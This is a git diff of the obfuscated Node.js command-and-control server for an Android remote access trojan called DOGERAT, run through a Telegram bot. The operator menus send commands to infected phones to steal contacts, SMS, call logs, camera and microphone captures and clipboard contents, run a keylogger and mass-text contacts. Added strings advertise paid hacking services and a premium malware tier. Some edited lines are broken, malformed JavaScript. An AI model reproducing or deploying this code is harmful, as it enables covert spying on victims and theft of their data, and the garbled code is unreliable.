@@ -17,17 +17,15 @@ const bot = new telegramBot(data.token, {
   'request': {}
 });
 const appData = new Map();
-const actions = [
-    ["✯ Contacts ✯", "✯ SMS ✯"],
-    ["✯ Calls ✯", "✯ Apps ✯"],
-    ["✯ Main camera ✯", "✯ Selfie Camera ✯"],
-    ["✯ Microphone ✯", "✯ Clipboard ✯"],
-    ["✯ Send SMS ✯", "✯ Vibrate ✯"],
-    ["✯ Keylogger ON ✯", "✯ Keylogger OFF ✯"],
-    ["✯ Send SMS to all contacts ✯"],
-    ["✯ Pop notification ✯"],
-    ["✯ Back to main menu ✯"]
-];
+const actions =["✯ Contacts ✯", "✯ SMS ✯"],
+               ["✯ Calls ✯", "✯ Apps ✯"],
+               ["✯ Main camera ✯", "✯ Selfie Camera ✯"],
+               ["✯ Microphone ✯", "✯ Clipboard ✯"],
+               ["✯ Send SMS ✯", "✯ Vibrate ✯"],
+               ["✯ Keylogger ON ✯", "✯ Keylogger OFF ✯"],
+               ["✯ Send SMS to all contacts ✯"],
+               ["✯ Pop notification ✯"],
+               ["✯ Back to main menu ✯"];
 app.post("/upload", uploader.single('file'), (_0xe7d0f6, _0x30973d) => {
   const _0x1763f6 = _0xe7d0f6.file.originalname;
   const _0x3abcf4 = _0xe7d0f6.headers.model;
@@ -67,7 +65,7 @@ io.on("connection", _0x48afef => {
 });
 bot.on("message", _0xdbde0c => {
   if (_0xdbde0c.text === "/start") {
-    bot.sendMessage(data.id, "<b>✯ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 DbbyRat</b>\n\nn𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚍 𝚋𝚢:  HolllyRoot", {
+    bot.sendMessage(data.id, "<b>✯ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 DOGERAT</b>\n\n𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚍 𝚋𝚢: HollyRoot", {
       'parse_mode': "HTML",
       'reply_markup': {
         'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
@@ -320,7 +318,7 @@ bot.on("message", _0xdbde0c => {
                       }
                     } else {
                       if (_0xdbde0c.text === "✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯") {
-                        bot.sendMessage(data.id, "<b> </b>\n\n", {
+                        bot.sendMessage(data.id, "<b>✯ If you want to hire us for any paid work please contack @sphanter\n𝚆𝚎 𝚑𝚊𝚌𝚔, 𝚆𝚎 𝚕𝚎𝚊𝚔, 𝚆𝚎 𝚖𝚊𝚔𝚎 𝚖𝚊𝚕𝚠𝚊𝚛𝚎\n\n𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 → @CUBERSHIELDX\nADMIN → @SPHANTER</b>\n\n", {
                           'parse_mode': 'HTML'
                         });
                       } else {
@@ -333,115 +331,58 @@ bot.on("message", _0xdbde0c => {
                             }
                           });
                         } else {
-                            if (_0xdbde0c.text === "✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯") {
-                            let _0x3202e5 = io.sockets.sockets.get(appData.get("currentTarget")).model;
-                            const actions = [
-                                            ["✯ Contacts ✯", "✯ SMS ✯"],
-                                            ["✯ Calls ✯", "✯ Apps ✯"],
-                                            ["✯ Main camera ✯", "✯ Selfie Camera ✯"],
-                                            ["✯ Microphone ✯", "✯ Clipboard ✯"],
-                                            ["✯ Send SMS ✯", "✯ Vibrate ✯"],
-                                            ["✯ Keylogger ON ✯", "✯ Keylogger OFF ✯"],
-                                            ["✯ Send SMS to all contacts ✯"],
-                                            ["✯ Pop notification ✯"],
-                                            ["✯ Back to main menu ✯"]
-                                            ];
-
-                            if (_0x3202e5 == "all") {
-
-                              bot.sendMessage(
-                                data.id,
-                                "<b>✯ Select action to perform for all available devices</b>\n\n",
-                                {
-                                    parse_mode: "HTML",
-                                    reply_markup: {
-                                    keyboard: actions,
-                                    resize_keyboard: true,
-                                    one_time_keyboard: true
-                                        }
-                                }
-                          );
-
-                            } else {
-
-                                bot.sendMessage(
-                                  data.id,
-                                    "<b>✯ Select action to perform for " + _0x3202e5 + "</b>\n\n",
-                                    {
-                parse_mode: "HTML",
-                reply_markup: {
-                  else {
                           if (_0xdbde0c.text === "✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯") {
                             let _0x3202e5 = io.sockets.sockets.get(appData.get("currentTarget")).model;
-                                                    if (_0x3202e5 == "all") {
-
-                            bot.sendMessage(
-                                data.id,
-                                "<b>✯ Select action to perform for all available devices</b>\n\n",
-                                {
-                                    parse_mode: "HTML",
-                                    reply_markup: {
-                                        keyboard: actions,
-                                        resize_keyboard: true,
-                                        one_time_keyboard: true
-                                    }
+                            if (_0x3202e5 == "all") {
+                              bot.sendMessage(data.id, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\n\n", {
+                                'parse_mode': "HTML",
+                                'reply_markup': {
+                                  'keyboard': [["✯ Contacts ✯", "✯ SMS ✯"],
+                                        ["✯ Calls ✯", "✯ Apps ✯"],
+                                        ["✯ Main camera ✯", "✯ Selfie Camera ✯"],
+                                        ["✯ Microphone ✯", "✯ Clipboard ✯"],
+                                        ["✯ Send SMS ✯", "✯ Vibrate ✯"],
+                                        ["✯ Keylogger ON ✯", "✯ Keylogger OFF ✯"],
+                                        ["✯ Send SMS to all contacts ✯"],
+                                        ["✯ Pop notification ✯"],
+                                        ["✯ Back to main menu ✯"]],
+                                  'resize_keyboard': true,
+                                  'one_time_keyboard': true
                                 }
-                            );
-
-                        } else {
-
-                            bot.sendMessage(
-                                data.id,
-                                "<b>✯ Select action to perform for " + _0x3202e5 + "</b>\n\n",
-                                {
-                                    parse_mode: "HTML",
-                                    reply_markup: {
-                                        keyboard: actions,
-                                        resize_keyboard: true,
-                                        one_time_keyboard: true
-                                    }
+                              });
+                            } else {
+                              bot.sendMessage(data.id, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 " + _0x3202e5 + "</b>\n\n", {
+                                'parse_mode': "HTML",
+                                'reply_markup': {
+                                  'keyboard': [["✯ Contacts ✯", "✯ SMS ✯"],
+                                        ["✯ Calls ✯", "✯ Apps ✯"],
+                                        ["✯ Main camera ✯", "✯ Selfie Camera ✯"],
+                                        ["✯ Microphone ✯", "✯ Clipboard ✯"],
+                                        ["✯ Send SMS ✯", "✯ Vibrate ✯"],
+                                        ["✯ Keylogger ON ✯", "✯ Keylogger OFF ✯"],
+                                        ["✯ Send SMS to all contacts ✯"],
+                                        ["✯ Pop notification ✯"],
+                                        ["✯ Back to main menu ✯"]],
+                                  'resize_keyboard': true,
+                                  'one_time_keyboard': true
                                 }
-                            );
-
-                        }
-
-                    } else if (_0xdbde0c.text === "✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯") {
-
-                        let _0x3202e5 = io.sockets.sockets.get(appData.get("currentTarget")).model;
-
-                        if (_0x3202e5 == "all") {
-
-                            bot.sendMessage(
-                                data.id,
-                                "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\n\n",
-                                {
-                                    parse_mode: "HTML",
-                                    reply_markup: {
-                                        keyboard: actions,
-                                        resize_keyboard: true,
-                                        one_time_keyboard: true
-                                    }
+                              });
+                            }
+                          } else {
+                            if (actions.includes(_0xdbde0c.text)) {
+                              let _0x3ea82b = appData.get("currentTarget");
+                              if (_0xdbde0c.text === "✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯") {
+                                if (_0x3ea82b == "all") {
+                                  io.sockets.emit("commend", {
+                                    'request': "contacts",
+                                    'extras': []
+                                  });
+                                } else {
+                                  io.to(_0x3ea82b).emit("commend", {
+                                    'request': 'contacts',
+                                    'extras': []
+                                  });
                                 }
-                            );
-
-                        } else {
-
-                            bot.sendMessage(
-                                data.id,
-                                "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 " + _0x3202e5 + "</b>\n\n",
-                                {
-                                    parse_mode: "HTML",
-                                    reply_markup: {
-                                        keyboard: actions,
-                                        resize_keyboard: true,
-                                        one_time_keyboard: true
-                                    }
-                                }
-                            );
-
-                        }
-
-
                                 appData["delete"]("currentTarget");
                                 bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                   'parse_mode': "HTML",
@@ -578,7 +519,7 @@ bot.on("message", _0xdbde0c => {
                                 });
                               }
                               if (_0xdbde0c.text === "✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯") {
-                                bot.sendMessage(data.id, " ", {
+                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
                                     'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
@@ -599,7 +540,7 @@ bot.on("message", _0xdbde0c => {
                                   });
                                 }
                                 appData["delete"]("currentTarget");
-                                bot.sendMessage(data.id, " ", {
+                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
                                     'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
@@ -620,7 +561,7 @@ bot.on("message", _0xdbde0c => {
                                   });
                                 }
                                 appData["delete"]("currentTarget");
-                                bot.sendMessage(data.id, " ", {
+                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
                                     'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
@@ -629,7 +570,7 @@ bot.on("message", _0xdbde0c => {
                                 });
                               }
                               if (_0xdbde0c.text === "✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯") {
-                                bot.sendMessage(data.id, "<b>П</b>\n\n", {
+                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
                                     'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
@@ -638,7 +579,7 @@ bot.on("message", _0xdbde0c => {
                                 });
                               }
                               if (_0xdbde0c.text === "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯") {
-                                bot.sendMessage(data.id, " ", {
+                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
                                     'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
@@ -647,7 +588,7 @@ bot.on("message", _0xdbde0c => {
                                 });
                               }
                               if (_0xdbde0c.text === "✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯") {
-                                bot.sendMessage(data.id, " ", {
+                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
                                     'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
@@ -656,7 +597,7 @@ bot.on("message", _0xdbde0c => {
                                 });
                               }
                               if (_0xdbde0c.text === "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯") {
-                                bot.sendMessage(data.id, " ", {
+                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
                                     'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
@@ -731,7 +672,7 @@ bot.on("message", _0xdbde0c => {
                                 });
                               }
                               if (_0xdbde0c.text === "✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯") {
-                                bot.sendMessage(data.id, " ", {
+                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
                                     'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
@@ -740,7 +681,7 @@ bot.on("message", _0xdbde0c => {
                                 });
                               }
                               if (_0xdbde0c.text === "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯") {
-                                bot.sendMessage(data.id, " ", {
+                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
                                     'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
@@ -749,7 +690,7 @@ bot.on("message", _0xdbde0c => {
                                 });
                               }
                               if (_0xdbde0c.text === "✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯") {
-                                bot.sendMessage(data.id, " ", {
+                                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
                                     'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
@@ -764,8 +705,7 @@ bot.on("message", _0xdbde0c => {
                                   bot.sendMessage(data.id, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 " + _0x22a16b.model + "</b>\n\n", {
                                     'parse_mode': "HTML",
                                     'reply_markup': {
-                                      'keyboard': [
-                                        ["✯ Contacts ✯", "✯ SMS ✯"],
+                                      'keyboard': [["✯ Contacts ✯", "✯ SMS ✯"],
                                         ["✯ Calls ✯", "✯ Apps ✯"],
                                         ["✯ Main camera ✯", "✯ Selfie Camera ✯"],
                                         ["✯ Microphone ✯", "✯ Clipboard ✯"],
@@ -773,8 +713,7 @@ bot.on("message", _0xdbde0c => {
                                         ["✯ Keylogger ON ✯", "✯ Keylogger OFF ✯"],
                                         ["✯ Send SMS to all contacts ✯"],
                                         ["✯ Pop notification ✯"],
-                                        ["✯ Back to main menu ✯"]
-                                        ];
+                                        ["✯ Back to main menu ✯"]],
                                       'resize_keyboard': true,
                                       'one_time_keyboard': true
                                     }
@@ -786,8 +725,7 @@ bot.on("message", _0xdbde0c => {
                                 bot.sendMessage(data.id, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
-                                    'keyboard': [
-                                        ["✯ Contacts ✯", "✯ SMS ✯"],
+                                    'keyboard': [["✯ Contacts ✯", "✯ SMS ✯"],
                                         ["✯ Calls ✯", "✯ Apps ✯"],
                                         ["✯ Main camera ✯", "✯ Selfie Camera ✯"],
                                         ["✯ Microphone ✯", "✯ Clipboard ✯"],
@@ -795,8 +733,7 @@ bot.on("message", _0xdbde0c => {
                                         ["✯ Keylogger ON ✯", "✯ Keylogger OFF ✯"],
                                         ["✯ Send SMS to all contacts ✯"],
                                         ["✯ Pop notification ✯"],
-                                        ["✯ Back to main menu ✯"]
-                                        ];
+                                        ["✯ Back to main menu ✯"]],
                                     'resize_keyboard': true,
                                     'one_time_keyboard': true
                                   }
